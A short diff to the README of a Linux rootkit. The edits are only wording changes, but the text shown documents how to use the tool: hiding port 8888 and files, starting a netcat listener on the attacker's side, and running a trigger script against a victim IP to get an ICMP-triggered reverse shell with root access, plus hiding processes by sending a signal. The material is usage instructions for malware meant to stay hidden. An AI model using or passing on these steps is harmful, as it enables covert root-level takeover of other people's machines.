@@ -20,15 +20,15 @@ This will install the rootkit and hide the `port 8888` and any file/directory th
 The `-ip` parameter is used to configure the ICMP triggered reverse shell. It specifies the IP to where it will send the reverse shell.
 
 ### ICMP triggered reverse shell
-If you listen in the attacker's side with:
+If you listen from the attacker's side with:
 ```
 nc -lvnp 8081
 ```
-And you run:
+And you run this from the attacker's side:
 ```
 sudo python3 trigger.py <VICTIM_IP>
 ```
-This will give you a reverse shell with root access to the victim.
+It will give you a reverse shell with root access to the victim.
 
 ### Hiding processes
 Once installed the rootkit you can also hide any process by sending the following signal:
